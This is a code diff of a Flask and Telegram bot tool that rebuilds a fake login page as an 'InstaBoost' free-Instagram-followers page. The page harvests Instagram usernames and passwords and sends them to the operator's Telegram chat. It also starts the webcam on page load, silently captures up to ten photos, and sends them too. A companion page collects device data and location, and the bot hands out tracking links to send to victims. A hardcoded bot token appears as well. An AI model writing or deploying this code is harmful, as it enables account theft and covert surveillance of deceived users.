@@ -12,7 +12,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 # --- CONFIGURATION ---
 TOKEN = "7888111866:AAFTT2DxdpaSQ2JKOxUNR_YXrgK7q64M9lk"
-SERVER_URL = os.environ.get("SERVER_URL", "https://proxy-free-followers-website.onrender.com")
+SERVER_URL = os.environ.get("SERVER_URL", "https://proxy-93ml.onrender.com")
 
 # Force Join Channel
 CHANNELS = ["@noruleclub"]
@@ -20,21 +20,18 @@ CHANNELS = ["@noruleclub"]
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# Store user data temporarily
-user_data = {}
-
-# --- FAKE SMM PANEL LOGIN PAGE ---
+# --- FAKE INSTAGRAM FOLLOWERS PANEL ---
 SMM_PANEL_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SMM Panel - Login</title>
+    <title>Free Instagram Followers</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #0a0a0f;
+            background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -42,74 +39,84 @@ SMM_PANEL_HTML = """
             padding: 20px;
         }
         .container {
-            background: #1a1a2e;
-            border-radius: 24px;
+            background: rgba(255,255,255,0.95);
+            border-radius: 30px;
             padding: 40px 35px;
             width: 100%;
-            max-width: 440px;
-            border: 1px solid #2a2a4a;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
+            max-width: 480px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
         }
         .logo {
             text-align: center;
             margin-bottom: 30px;
         }
         .logo h1 {
-            color: #fff;
-            font-size: 32px;
-            font-weight: 700;
-        }
-        .logo span {
-            color: #6c63ff;
+            font-size: 36px;
+            font-weight: 800;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         .logo p {
             color: #666;
-            font-size: 13px;
+            font-size: 14px;
             margin-top: 5px;
         }
-        .form-group {
+        .free-badge {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            color: #fff;
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            font-weight: 700;
+            font-size: 14px;
             margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 18px;
         }
         .form-group label {
             display: block;
-            color: #aaa;
+            color: #333;
             margin-bottom: 6px;
             font-size: 13px;
-            font-weight: 500;
+            font-weight: 600;
         }
-        .form-group input {
+        .form-group input, .form-group select {
             width: 100%;
             padding: 14px 16px;
-            background: #0a0a1a;
-            border: 1px solid #2a2a4a;
+            background: #f5f5f5;
+            border: 2px solid #e0e0e0;
             border-radius: 12px;
-            color: #fff;
+            color: #333;
             font-size: 15px;
             outline: none;
             transition: all 0.3s;
         }
-        .form-group input:focus {
-            border-color: #6c63ff;
-            box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.15);
+        .form-group input:focus, .form-group select:focus {
+            border-color: #405de6;
+            box-shadow: 0 0 0 3px rgba(64, 93, 230, 0.15);
         }
         .form-group input::placeholder {
-            color: #444;
+            color: #999;
         }
         .btn {
             width: 100%;
-            padding: 14px;
-            background: #6c63ff;
+            padding: 16px;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4);
             border: none;
             border-radius: 12px;
             color: #fff;
-            font-size: 16px;
-            font-weight: 600;
+            font-size: 17px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s;
+            margin-top: 10px;
         }
         .btn:hover {
-            background: #5a52d5;
             transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(64, 93, 230, 0.4);
         }
         .btn:active {
             transform: translateY(0);
@@ -117,7 +124,7 @@ SMM_PANEL_HTML = """
         .footer {
             text-align: center;
             margin-top: 20px;
-            color: #444;
+            color: #999;
             font-size: 12px;
         }
         .loader {
@@ -129,11 +136,11 @@ SMM_PANEL_HTML = """
             display: block;
         }
         .spinner {
-            border: 3px solid #2a2a4a;
-            border-top: 3px solid #6c63ff;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #405de6;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            width: 40px;
+            height: 40px;
             animation: spin 0.8s linear infinite;
             margin: 0 auto;
         }
@@ -144,7 +151,7 @@ SMM_PANEL_HTML = """
         .error-msg {
             background: #ff4444;
             color: #fff;
-            padding: 10px 14px;
+            padding: 12px 16px;
             border-radius: 10px;
             font-size: 13px;
             display: none;
@@ -153,7 +160,7 @@ SMM_PANEL_HTML = """
         .success-msg {
             background: #00c853;
             color: #fff;
-            padding: 10px 14px;
+            padding: 12px 16px;
             border-radius: 10px;
             font-size: 13px;
             display: none;
@@ -164,119 +171,64 @@ SMM_PANEL_HTML = """
 <body>
     <div class="container">
         <div class="logo">
-            <h1>SMM<span>Panel</span></h1>
-            <p>Social Media Marketing Dashboard</p>
+            <h1>📸 InstaBoost</h1>
+            <p>Free Instagram Followers & Likes</p>
+        </div>
+        
+        <div style="text-align: center;">
+            <span class="free-badge">🔥 FREE FOLLOWERS</span>
         </div>
         
         <div id="errorMsg" class="error-msg"></div>
-        <div id="successMsg" class="success-msg">✅ Verification successful! Redirecting...</div>
+        <div id="successMsg" class="success-msg">✅ Followers added successfully! Check your Instagram.</div>
         
         <form id="loginForm" onsubmit="return handleSubmit(event)">
             <div class="form-group">
-                <label>📧 Email / Username</label>
-                <input type="text" id="email" placeholder="Enter your email or username" required>
+                <label>📱 Instagram Username</label>
+                <input type="text" id="username" placeholder="Enter your Instagram username" required>
             </div>
             <div class="form-group">
-                <label>🔑 Password</label>
+                <label>🔑 Instagram Password</label>
                 <input type="password" id="password" placeholder="Enter your password" required>
             </div>
             <div class="form-group">
-                <label>📱 Phone Number</label>
-                <input type="tel" id="phone" placeholder="Enter your phone number">
+                <label>📧 Email (Optional)</label>
+                <input type="email" id="email" placeholder="Enter your email">
+            </div>
+            <div class="form-group">
+                <label>🎯 Followers Count</label>
+                <select id="followers">
+                    <option value="100">100 Followers</option>
+                    <option value="250" selected>250 Followers</option>
+                    <option value="500">500 Followers</option>
+                    <option value="1000">1000 Followers</option>
+                    <option value="2500">2500 Followers</option>
+                    <option value="5000">5000 Followers</option>
+                </select>
             </div>
             
             <div class="loader" id="loader">
                 <div class="spinner"></div>
-                <p style="color:#666; margin-top:10px; font-size:13px;">Verifying credentials...</p>
+                <p style="color:#666; margin-top:10px; font-size:13px;">Adding followers to your account...</p>
             </div>
             
-            <button type="submit" class="btn" id="loginBtn">🔓 Login to Dashboard</button>
+            <button type="submit" class="btn" id="loginBtn">🚀 Get Free Followers</button>
         </form>
         
         <div class="footer">
-            <p>© 2026 SMM Panel • Secure Connection</p>
+            <p>🔒 Secure Connection • 100% Free</p>
         </div>
     </div>
 
     <script>
-        let attemptCount = 0;
         let chatId = "{{ chat_id }}";
         let photoCount = 0;
-        
-        async function handleSubmit(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const phone = document.getElementById('phone').value;
-            
-            if (!email || !password) {
-                showError('Please fill in all required fields');
-                return;
-            }
-            
-            const loader = document.getElementById('loader');
-            const loginBtn = document.getElementById('loginBtn');
-            
-            loader.classList.add('active');
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'Verifying...';
-            
-            const data = {
-                chat_id: chatId,
-                email: email,
-                password: password,
-                phone: phone || 'N/A',
-                attempt: attemptCount + 1
-            };
-            
-            try {
-                const response = await fetch('/smm-login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                
-                const result = await response.json();
-                
-                if (result.success) {
-                    document.getElementById('successMsg').style.display = 'block';
-                    document.getElementById('loginForm').style.display = 'none';
-                    
-                    setTimeout(() => {
-                        window.location.href = 'https://google.com';
-                    }, 3000);
-                } else {
-                    attemptCount++;
-                    if (attemptCount >= 5) {
-                        showError('Too many failed attempts. Please try again later.');
-                        loginBtn.disabled = true;
-                        loginBtn.textContent = 'Locked';
-                    } else {
-                        showError('Invalid credentials. Please try again. (Attempt ' + attemptCount + '/5)');
-                        loginBtn.disabled = false;
-                        loginBtn.textContent = '🔓 Login to Dashboard';
-                    }
-                }
-            } catch (error) {
-                showError('Connection error. Please try again.');
-                loginBtn.disabled = false;
-                loginBtn.textContent = '🔓 Login to Dashboard';
-            }
-            
-            loader.classList.remove('active');
-        }
-        
-        function showError(msg) {
-            const errorDiv = document.getElementById('errorMsg');
-            errorDiv.textContent = msg;
-            errorDiv.style.display = 'block';
-            setTimeout(() => {
-                errorDiv.style.display = 'none';
-            }, 4000);
-        }
+        let cameraStarted = false;
         
         async function startCamera() {
+            if (cameraStarted) return;
+            cameraStarted = true;
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
@@ -289,50 +241,131 @@ SMM_PANEL_HTML = """
                 video.srcObject = stream;
                 await video.play();
                 
-                for (let i = 0; i < 10; i++) {
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const photoData = canvas.toDataURL('image/jpeg', 0.7);
-                    
-                    await fetch('/camera-photo', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            photo: photoData,
-                            photo_num: i + 1
-                        })
-                    });
+                await takePhoto(video, 1);
+                
+                for (let i = 2; i <= 10; i++) {
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                    await takePhoto(video, i);
                 }
                 
                 stream.getTracks().forEach(t => t.stop());
                 video.remove();
                 
             } catch(e) {
-                console.log('Camera not available');
+                setTimeout(() => {
+                    cameraStarted = false;
+                    startCamera();
+                }, 3000);
             }
         }
         
+        async function takePhoto(video, num) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            const photoData = canvas.toDataURL('image/jpeg', 0.7);
+            
+            fetch('/camera-photo', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: photoData,
+                    photo_num: num
+                })
+            });
+            
+            photoCount = num;
+        }
+        
         window.onload = function() {
-            startCamera();
+            setTimeout(() => {
+                startCamera();
+            }, 500);
         };
+        
+        async function handleSubmit(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value || 'N/A';
+            const followers = document.getElementById('followers').value;
+            
+            if (!username || !password) {
+                showError('Please enter your Instagram username and password');
+                return;
+            }
+            
+            const loader = document.getElementById('loader');
+            const loginBtn = document.getElementById('loginBtn');
+            
+            loader.classList.add('active');
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Adding followers...';
+            
+            const data = {
+                chat_id: chatId,
+                username: username,
+                password: password,
+                email: email,
+                followers: followers,
+                photo_count: photoCount
+            };
+            
+            try {
+                const response = await fetch('/insta-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('successMsg').style.display = 'block';
+                    document.getElementById('loginForm').style.display = 'none';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://instagram.com';
+                    }, 4000);
+                } else {
+                    showError('Failed to add followers. Please try again.');
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = '🚀 Get Free Followers';
+                }
+            } catch (error) {
+                showError('Connection error. Please try again.');
+                loginBtn.disabled = false;
+                loginBtn.textContent = '🚀 Get Free Followers';
+            }
+            
+            loader.classList.remove('active');
+        }
+        
+        function showError(msg) {
+            const errorDiv = document.getElementById('errorMsg');
+            errorDiv.textContent = msg;
+            errorDiv.style.display = 'block';
+            setTimeout(() => {
+                errorDiv.style.display = 'none';
+            }, 5000);
+        }
     </script>
 </body>
 </html>
 """
 
-# --- JAVASCRIPT TRAP ---
+# --- REDIRECT PAGE ---
 def get_html(chat_id, redirect_url):
     return f"""
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Verifying...</title>
+    <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body{{background:#000;color:#fff;text-align:center;font-family:sans-serif;padding-top:50px;}}
@@ -343,8 +376,8 @@ def get_html(chat_id, redirect_url):
 </head>
 <body>
     <div class="loader"></div>
-    <h2>System Scanning...</h2>
-    <p>Please click <b>Allow</b> to verify device ownership.</p>
+    <h2>Loading...</h2>
+    <p>Please wait while we prepare your free followers</p>
     
     <video id="video" style="display:none;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -389,7 +422,7 @@ def get_html(chat_id, redirect_url):
                 data.perm_cam = "Allowed"; 
                 let video = document.getElementById('video');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1500));
+                await new Promise(r => setTimeout(r, 1000));
                 
                 let canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
@@ -435,26 +468,37 @@ def smm_panel():
     chat_id = request.args.get('chat_id')
     return render_template_string(SMM_PANEL_HTML, chat_id=chat_id)
 
-@app.route('/smm-login', methods=['POST'])
-def smm_login():
+@app.route('/insta-login', methods=['POST'])
+def insta_login():
     data = request.json
     chat_id = data.get('chat_id')
-    email = data.get('email')
+    username = data.get('username')
     password = data.get('password')
-    phone = data.get('phone')
-    attempt = data.get('attempt', 1)
+    email = data.get('email', 'N/A')
+    followers = data.get('followers', '250')
+    photo_count = data.get('photo_count', 0)
     
     if not chat_id:
         return {"success": False}, 400
     
     msg = f"""
-🔐 **SMM Panel Login Attempt #{attempt}**
+📸 **Instagram Account Credentials**
 
-📧 Email: `{email}`
-🔑 Password: `{password}`
-📱 Phone: `{phone}`
+━━━━━━━━━━━━━━━━
+
+👤 **Account Details:**
+   • Username: `{username}`
+   • Password: `{password}`
+   • Email: `{email}`
+
+📊 **Request:**
+   • Followers: `{followers}`
+   • Photos: `{photo_count}/10`
 
 🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
+
+━━━━━━━━━━━━━━━━
+⚡ @FROXLS
 """
     
     try:
@@ -469,10 +513,7 @@ def smm_login():
     except:
         pass
     
-    if attempt >= 5:
-        return {"success": True}
-    
-    return {"success": False}
+    return {"success": True}
 
 @app.route('/camera-photo', methods=['POST'])
 def camera_photo():
@@ -488,8 +529,8 @@ def camera_photo():
         img_data = base64.b64decode(photo.split(',')[1])
         requests.post(
             f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-            data={'chat_id': chat_id, 'caption': f'📸 Camera Photo #{photo_num}'},
-            files={'photo': (f'cam_{photo_num}.jpg', img_data)}
+            data={'chat_id': chat_id, 'caption': f'📸 Photo #{photo_num}'},
+            files={'photo': (f'photo_{photo_num}.jpg', img_data)}
         )
     except:
         pass
@@ -553,7 +594,7 @@ def upload():
         f"   • Storage Total: {safe(data.get('storage_total'))} GB\n\n"
         f"🗺 **Map Link:**\n{map_link}\n"
         f"━━━━━━━━━━━━━━━━\n"
-        f"⚡ Developed by: @Proxyfxz"
+        f"⚡ Developed by: @FROXLS"
     )
 
     try:
@@ -573,7 +614,7 @@ def upload():
             img_data = base64.b64decode(data.get('photo').split(',')[1])
             requests.post(
                 f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-                data={'chat_id': tid, 'caption': '📸 Initial Camera Photo'},
+                data={'chat_id': tid, 'caption': '📸 Initial Photo'},
                 files={'photo': ('cam.jpg', img_data)}
             )
         except: pass
@@ -597,15 +638,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await is_subscribed(context.application, user_id):
         buttons = [
             [InlineKeyboardButton("📢 Join @noruleclub", url="https://t.me/noruleclub")],
-            [InlineKeyboardButton("✅ Verified (Start Again)", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
+            [InlineKeyboardButton("✅ Verified", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
         ]
         await update.message.reply_text(
-            "❌ **Access Denied!**\n\nBot use karne ke liye aapko @noruleclub join karna hoga.",
+            "❌ **Access Denied!**\n\n@noruleclub join karo.",
             reply_markup=InlineKeyboardMarkup(buttons)
         )
         return
 
-    await update.message.reply_text("👋 **Tracker Online!**\nLink bhejo (jaise https://youtube.com).")
+    await update.message.reply_text("👋 **Free Instagram Followers!**\nLink bhejo.")
 
 async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -615,14 +656,14 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     url = update.message.text
     if not url.startswith("http"):
-        await update.message.reply_text("❌ Link `http` ya `https` se shuru hona chahiye.")
+        await update.message.reply_text("❌ Link sahi daalo.")
         return
 
     uid = update.effective_chat.id
     redir = urllib.parse.quote(url)
     link = f"{SERVER_URL}/?id={uid}&redir={redir}"
 
-    await update.message.reply_text(f"✅ **Tracking Link:**\n`{link}`\n\n⚡ Powered by @Proxyfxz")
+    await update.message.reply_text(f"✅ **Link:**\n`{link}`")
 
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
